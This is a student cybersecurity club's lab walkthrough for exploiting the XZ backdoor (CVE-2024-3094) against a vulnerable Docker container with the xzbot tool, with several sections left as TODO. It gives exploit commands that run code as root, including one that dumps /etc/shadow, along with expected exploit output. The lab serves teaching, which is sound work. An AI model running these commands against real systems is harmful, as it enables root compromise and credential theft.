Title: Using the XZ backdoor
Preview: Hands-on hacking activity with the XZ backdoor
Date: 2024-04-02
Tags: nkcyber, cybersecurity

## Introduction

Hi! I'm Zack Sargent. I run the cybersecurity club at [NKU](https://www.nku.edu/),
and our members were interested in getting a hands-on experience with the recently
exposed [XZ backdoor](https://arstechnica.com/security/2024/04/what-we-know-about-the-xz-utils-backdoor-that-almost-infected-the-world/).

You may want to consult the materials from the "Further Reading" section for a more comprehensive understanding of the vulnerability.

Today, we want to specifically answer the question: **"How can I exploit the XZ backdoor?"**.

## Am I vulnerable?

[Xe Iaso's inital report](https://xeiaso.net/notes/2024/xz-vuln/) contains very actionable information to determine if you are vulnerable to this exploit:

> If you are using one of these distributions, you should check to see if you are using xz version 5.6.0 or 5.6.1. If you are, you should downgrade to 5.4.6. If you can't downgrade, you should disable public-facing SSH servers until you can downgrade.
>
> At this time, we believe that version 5.4.6 is not vulnerable to this exploit. If you are using a different version, you should check with your distribution's security mailing list to see if you are vulnerable. If you are not already subscribed to your distribution's security mailing list, you should do so now.
>
> Here is how you can tell if you're running the affected version:
> ```bash
> xz --version
> ```
> Here is what the output on the vulnerable version looks like:
> ```bash
> $ xz --version
> xz (XZ Utils) 5.6.1
> liblzma 5.6.1
> ```

## Understanding the mechanics

As has been covered extensively [elsewhere](#further-reading), this backdoor involved a sophisticated process in which the binaries distributed to users is different from what was on GitHub (before it was deleted), so that the backdoor could not be found by auditing the code.

As such, if we want to exploit this vulnerability, it is important to first find

## Random Notes (to be organized)

- There are quite a lot of contingent factors

## Virtual Machine

To create a safe environment to work with this vulnerable code, I recommend working with it in a virtual machine.

I'm personally going to create a Kali VM, because that's the standard for our club.

TODO: screenshots

Consider adding more ram to your VM before going further.

### Docker installation

In your hacking environment, you can test if you have `docker` set up properly with:

```bash
docker ps
```

Otherwise, refer to how to install docker for your distro. ([See Kali linux here.](https://www.kali.org/docs/containers/installing-docker-on-kali/#installing-docker-ce-on-kali-linux))
Remember that you may want to `sudo reboot` for docker to set up properly.

### Installing Docker Testbed

To practice this exploit, we're going to use Davide Guerri's ["Small collection of famous exploits"](https://github.com/dguerri/exploits-collection/tree/main), which describes itself as a "Docker test beds for famous, high-severity, exploits". In this repo, Davide has done a great job of dockerizing [Anthony Weems's xzbot](https://github.com/amlweems/xzbot) for testing and practice. It looks like both Anthony and Davide work for Google, which isn't relevant, but it makes me feel better about not being able to figure this out on my own.

In your hacking environment, run [the setup commands](https://github.com/dguerri/exploits-collection/tree/main?tab=readme-ov-file#how-to-use):

>
> ```bash
> git clone https://github.com/dguerri/exploits-collection.git
> cd exploits-collection
> git submodule update --init --recursive
> ```


```bash
cd xz-5.6.1-backdoor
git submodule update --init --recursive
```

### Running the containers

Now, you should be in the [`xz-5.6.1-backdoor`](https://github.com/dguerri/exploits-collection/tree/main/xz-5.6.1-backdoor) folder.

Then, start the vulnerable server in the background.

```bash
docker compose up --build -d
```

This will create two networked containers:

    1. `xzbackdoor-vulnerable` - This is what we will attack
    2. `xzbackdoor-poc` - This is where we will attack from

(note that [the Makefile](https://github.com/dguerri/exploits-collection/blob/08b65b557e93a6a8e9936c36febc6e9ef7ccbd8b/xz-5.6.1-backdoor/Makefile#L2) specifies `docker-compose`, but you're probably going to want `docker compose`. [What's the difference?](https://stackoverflow.com/a/66516826))

This will take care of ensuring that we download and set up the correct versions of `xz` and `liblzma`. Note the vulnerable `.deb` for `liblzma` [is in Davide's repo](https://github.com/dguerri/exploits-collection/blob/08b65b557e93a6a8e9936c36febc6e9ef7ccbd8b/xz-5.6.1-backdoor/deb/liblzma5_5.6.1-1_amd64.deb).

### Executing the attack

Davide's has listed instructions on [how to execute the backdoor](https://github.com/dguerri/exploits-collection/blob/08b65b557e93a6a8e9936c36febc6e9ef7ccbd8b/xz-5.6.1-backdoor/README.md) via docker compose, but I have modified these instructions slightly to work from within the bash prompt of the docker instance.

```bash
# start bash in the docker instance
docker exec -it xzbackdoor-poc bash
# activate python environment (optional, but nice if you want to use patch.py)
. /opt/venv/bin/activate
```

From here, we can attack the system as if we were running commands on it normally.

> [Note:](https://github.com/dguerri/exploits-collection/blob/main/xz-5.6.1-backdoor/README.md)
> The ed448 key pair is generated from a random seed. Info on the key and its seed are printed out and stored in `/exploit/ed448info.txt`

We want to get the seed that it randomly generated during setup. In the real world, this is reminiscent of the private key that only the original creators of the exploit have.

```bash
# this extracts the seed from the information printed during the challenge setup
seed="$(sed -n 's/^Seed: \([0-9][0-9]*\)/\1/p' /exploit/ed448info.txt)"
# you can do 'cat /exploit/ed448info.txt' for more information.
```

```bash
# Make sure you can run xzbot. ask it for help
/exploit/xzbot/xzbot --help
# (the specific installation location is arbitrary to this exercise)
```

<aside>
You should see:
```
Usage of /exploit/xzbot/xzbot:
  -addr string
        ssh server address (default "127.0.0.1:2222")
  -cmd string
        command to run via system() (default "id > /tmp/.xz")
  -seed string
        ed448 seed, must match xz backdoor key (default "0")
```
</aside>


```bash
# use the seed we found earlier
/exploit/xzbot/xzbot -addr xzbackdoor-vulnerable:22 -seed "$seed" -cmd "cat /etc/shadow > /tmp/.xz"
```

Note the output of this should end with "`ssh: handshake failed: EOF`". This is normal.

<aside>

<details>

<summary>See expected output</summary>

```
00000000  00 00 00 1c 73 73 68 2d  72 73 61 2d 63 65 72 74  |....ssh-rsa-cert|
00000010  2d 76 30 31 40 6f 70 65  6e 73 73 68 2e 63 6f 6d  |-v01@openssh.com|
00000020  00 00 00 00 00 00 00 03  01 00 01 00 00 01 01 01  |................|
00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000060  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000090  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000100  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000110  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000120  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000130  00 00 00 00 00 00 00 00  00 00 00 01 00 00 00 00  |................|
00000140  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000150  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000160  00 00 01 14 00 00 00 07  73 73 68 2d 72 73 61 00  |........ssh-rsa.|
00000170  00 00 01 01 00 00 01 00  34 12 00 00 78 56 00 00  |........4...xV..|
00000180  a2 ff d9 f9 ff ff ff ff  c9 3e e1 f5 ee 16 eb 33  |.........>.....3|
00000190  28 cf 45 98 fc 2b 06 56  c1 a6 33 f7 1d bc c3 c5  |(.E..+.V..3.....|
000001a0  83 3f f1 d2 82 5d 65 5c  00 59 5e bf bb f5 41 aa  |.?...]e\.Y^...A.|
000001b0  ca 4a 69 fd 14 ec 42 01  e2 b3 c4 58 f0 c4 c2 a0  |.Ji...B....X....|
000001c0  e7 5c 06 2d 72 aa 97 fd  4e 62 32 c0 16 be fa 0d  |.\.-r...Nb2.....|
000001d0  bb de 80 e0 92 d1 1e 3e  e6 41 b9 d0 33 e4 a0 5d  |.......>.A..3..]|
000001e0  08 6f 94 03 57 92 63 6c  80 86 66 a3 0b d2 d7 1d  |.o..W.cl..f.....|
000001f0  b2 ed 8a ed 29 55 09 2d  14 37 aa 89 d4 4a ba e2  |....)U.-.7...J..|
00000200  6e 72 49 bc 95 0a ff 3f  aa a5 31 d0 2e d7 65 ec  |nrI....?..1...e.|
00000210  bd 53 4d db 68 16 b9 ea  fd 44 00 00 00 00 00 00  |.SM.h....D......|
00000220  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000230  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000240  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000250  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000260  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000270  00 00 00 00 00 00 00 00  00 00 00 10 00 00 00 07  |................|
00000280  73 73 68 2d 72 73 61 00  00 00 01 00              |ssh-rsa.....|
2024/04/05 03:54:12 ssh: handshake failed: EOF
```

</details>
</aside>

Now, we can prove that we obtained remote code execution by opening another terminal and running:

```bash
# go into the vulnerable docker container, and read the file that we created via our SSH connection
docker exec xzbackdoor-vulnerable cat /tmp/.xz
```

To prove we're executing as root, we can do the following from the attacking container:

```bash
/exploit/xzbot/xzbot -addr xzbackdoor-vulnerable:22 -seed "$seed" -cmd 'echo "current user: $(whoami)" > /tmp/whoami.txt'
```

and then prove it by opening another terminal and running:
```bash
docker exec xzbackdoor-vulnerable cat /tmp/whoami.txt
# should print 'current user: root'
```

This proves that we're getting remote code execution as root.

### Analysis of xzbot

But, why are we using xzbot? Is it doing anything magical to help us out here?

Nope! It's just establishing the SSH connection with the appropriate key!

> ```go
> 	// ...
> 	signingKey := ed448.NewKeyFromSeed(seed[:])     // creates a key from same seed as in vulnerable system
> 	xz := &xzSigner{                                // xzSigner takes a signing key and generates the appropriate public key
> 		signingKey:    signingKey,
> 		encryptionKey: signingKey[ed448.SeedSize:],
> 	}
> 	// this creates an SSH client as the root user
> 	config := &ssh.ClientConfig{
> 		User: "root",
> 		Auth: []ssh.AuthMethod{                     // Establishes the authentication method using the public
> 			ssh.PublicKeys(xz),                     //   key generated from the initial signing key and seed.
> 		},
> 		HostKeyCallback: xz.HostKeyCallback,        // takes the SSH public key and computes a hash
> 	}
> 	client, err := ssh.Dial("tcp", *addr, config)   // establish an SSH connection
> 	// ...
> ```
> 
> &mdash; [xzbot/main.go](https://github.com/amlweems/xzbot/blob/8ae5b706fb2c6040a91b233ea6ce39f9f09441d5/main.go#L193-L205) (comments are mine)

## How to exploit without using xzbot?

TODO

## What's this about a killswitch?

TODO

## Further Reading

I consulted a bunch of resources when building this list.
Here's a compilation of the resources I found to be helpful, with the date they were first posted.

<!-- make list of links easier to read -->
<style>
section#further-reading li,
section#further-reading a,
section#further-reading p {
    line-height: 1.1em;
    text-decoration: none;
    margin: 0;
    padding: 0;
}
section#further-reading li {
    margin-bottom: 0.2rem;
}
</style>

<section id="further-reading">

- xzbot: <https://github.com/amlweems/xzbot>
    - Credit: Anthony Weems [GitHub](https://github.com/amlweems), [Mastodon](https://infosec.exchange/@amlw)
    - [Docker testbed for xzbot](https://github.com/dguerri/exploits-collection/tree/main/xz-5.6.1-backdoor)
- [Wikipedia](https://en.wikipedia.org/wiki/XZ_Utils_backdoor)

- [Andres Freund's Announcement](https://www.openwall.com/lists/oss-security/2024/03/29/4) (2024-03-29)
    - [Andres Freund's Mastodon Post](https://mastodon.social/@AndresFreundTec/112180083704606941) (2024-03-29)
- [CVE-2024-3094 published](https://nvd.nist.gov/vuln/detail/CVE-2024-3094) (2024-03-29)
- [liblzma and xz version 5.6.0 and 5.6.1 are vulnerable to arbitrary code execution compromise](https://xeiaso.net/notes/2024/xz-vuln/) (2024-03-29)
- ["Everything I Know About the XZ Backdoor"](https://boehs.org/node/everything-i-know-about-the-xz-backdoor) (2024-03-29)
- [Low Level Learning's "secret backdoor found in open source software (xz situation breakdown)" -](https://youtu.be/jqjtNDtbDNI) (2024-03-29)
- [Lasse Collin - XZ Utils backdoor](https://tukaani.org/xz-backdoor/) (2024-03-30)
    - [Git Mirror for XZ](https://git.tukaani.org/)
- [A Microcosm of the interactions in Open Source projects](https://robmensching.com/blog/posts/2024/03/30/a-microcosm-of-the-interactions-in-open-source-projects/) (2024-03-30)
- [Killswitch Thread](https://social.hackerspace.pl/@q3k/112184695043115759) - [Killswitch Post](https://social.hackerspace.pl/@q3k/112184808331214658) (2024-03-30)
    - <https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01>
- ["2024-03-30: xz/liblzma: Bash-stage Obfuscation Explained"](https://gynvael.coldwind.pl/?lang=en&id=782) (2024-03-30)
- [Timing analysis](https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and) (2024-03-30)
- ["Watching xz unfold from afar"](https://connortumbleson.com/2024/03/31/watching-xz-unfold-from-afar/) (2024-03-31)
- [Twitter InfoGraphic](https://twitter.com/fr0gger_/status/1774342248437813525) (2024-03-31)
- [XZ Utils Backdoor - critical SSH vulnerability (CVE-2024-3094)](https://pentest-tools.com/blog/xz-utils-backdoor-cve-2024-3094) (2024-04-01)
- [Timeline](https://research.swtch.com/xz-timeline) (2024-04-01)
- [The xz attack shell script](https://research.swtch.com/xz-script) (2024-04-02)
- [Ars Technica Overview](https://arstechnica.com/security/2024/04/what-we-know-about-the-xz-utils-backdoor-that-almost-infected-the-world/) (2024-04-01)
- [What Everyone Missed About The Linux Hack](https://youtu.be/0pT-dWpmwhA) (2024-04-01)
- [ThePrimeagen & Low Level Learning: "xz Exploit Is WILD - Must See Bash Part"](https://youtu.be/LaRKIwpGPTU) (2024-04-01)
- [xz-utils-exploit-lab](https://github.com/ps-interactive/xz-utils-exploit-lab) (2024-04-02)
- ["reflections on distrusting xz"](https://joeyh.name/blog/entry/reflections_on_distrusting_xz/) (2024-04-03)
- [Low Level Learning - "revealing the features of the XZ backdoor"](https://youtu.be/vV_WdTBbww4) (2024-04-03)


</section>

